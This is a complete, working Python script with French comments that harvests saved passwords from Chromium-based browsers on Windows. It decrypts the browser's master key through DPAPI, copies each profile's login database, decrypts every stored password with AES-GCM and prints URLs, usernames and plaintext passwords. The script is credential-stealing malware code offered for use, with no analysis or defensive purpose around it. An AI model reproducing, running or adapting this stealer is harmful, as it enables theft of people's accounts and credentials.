#!/usr/bin/env python
import os
import json
import base64
import sqlite3
import shutil
import tempfile
import ctypes
from ctypes import wintypes, byref, Structure, POINTER, c_byte
from Crypto.Cipher import AES

# Structures pour DPAPI
class DATA_BLOB(Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", POINTER(c_byte))
    ]

def dpapi_decrypt(encrypted_bytes: bytes) -> bytes:
    blob_in = DATA_BLOB(len(encrypted_bytes),
                        ctypes.cast(ctypes.create_string_buffer(encrypted_bytes), POINTER(c_byte)))
    blob_out = DATA_BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
        byref(blob_in), None, None, None, None, 0, byref(blob_out)
    ):
        raise ctypes.WinError()
    ptr = ctypes.cast(blob_out.pbData, POINTER(c_byte * blob_out.cbData))
    data = bytes(ptr.contents)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return data

# Config chemins
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
APPDATA      = os.getenv("APPDATA")

CHROMIUM_BROWSERS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA or "", "Google", "Chrome", "User Data")},
    {"name": "Edge",   "path": os.path.join(LOCALAPPDATA or "", "Microsoft", "Edge", "User Data")},
    {"name": "Opera",  "path": os.path.join(APPDATA      or "", "Opera Software", "Opera Stable")},
    {"name": "Brave",  "path": os.path.join(LOCALAPPDATA or "", "BraveSoftware", "Brave-Browser", "User Data")},
    {"name": "Yandex", "path": os.path.join(APPDATA      or "", "Yandex", "YandexBrowser", "User Data")},
]

PROFILES = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]

def get_chrome_key(local_state_path: str) -> bytes:
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return dpapi_decrypt(enc_key)
    except Exception as e:
        raise RuntimeError(f"DPAPI key extraction failed: {e}")

def decrypt_password(buff: bytes, key: bytes) -> str:
    # AES‑GCM (Chrome ≥80)
    if buff.startswith(b'v10'):
        try:
            iv = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"    [!] AES‑GCM decrypt error: {e}")
    # DPAPI fallback
    try:
        return dpapi_decrypt(buff).decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"    [!] DPAPI fallback error: {e}")
    return ""

def extract_passwords():
    results = []
    for browser in CHROMIUM_BROWSERS:
        base = browser["path"]
        print(f"\n>>> {browser['name']} @ {base}")
        if not os.path.isdir(base):
            print("    → Chemin introuvable, on skip ce navigateur")
            continue

        local_state = os.path.join(base, "Local State")
        if not os.path.isfile(local_state):
            print("    → Pas de Local State, skip")
            continue

        try:
            key = get_chrome_key(local_state)
            print("    → Clé AES OK")
        except Exception as e:
            print(f"    → Impossible d’extraire la clé AES: {e}")
            continue

        for profile in PROFILES:
            login_db = os.path.join(base, profile, "Login Data")
            if not os.path.isfile(login_db):
                print(f"  • Profil '{profile}' : pas de Login Data")
                continue
            print(f"  • Profil '{profile}' : Login Data trouvé")

            # copier en temp
            fd, tmp = tempfile.mkstemp(suffix=".db")
            os.close(fd)
            try:
                shutil.copy2(login_db, tmp)
            except Exception as e:
                print(f"      → Erreur copy2: {e}")
                os.remove(tmp)
                continue

            try:
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cur.fetchall()
                print(f"      → {len(rows)} entrées dans la DB")
                for url, user, enc in rows:
                    if not enc:
                        continue
                    blob = enc if isinstance(enc, (bytes, bytearray)) else bytes(enc)
                    pwd = decrypt_password(blob, key)
                    print(f"        - {url} / {user} → '{pwd}'")
                    results.append({
                        "browser": browser["name"],
                        "profile": profile,
                        "url": url,
                        "username": user,
                        "password": pwd
                    })
                cur.close()
            except Exception as e:
                print(f"      → Erreur lecture SQLite: {e}")
            finally:
                conn.close()
                os.remove(tmp)

    return results

if __name__ == "__main__":
    print("=== Début extraction mots de passe Chromium ===")
    pw = extract_passwords()
    print("\n=== Extraction terminée ===")
    if not pw:
        print("⚠️ Aucun mot de passe récupéré.")
    else:
        print(f"✅ {len(pw)} mot(s) de passe extrait(s).")
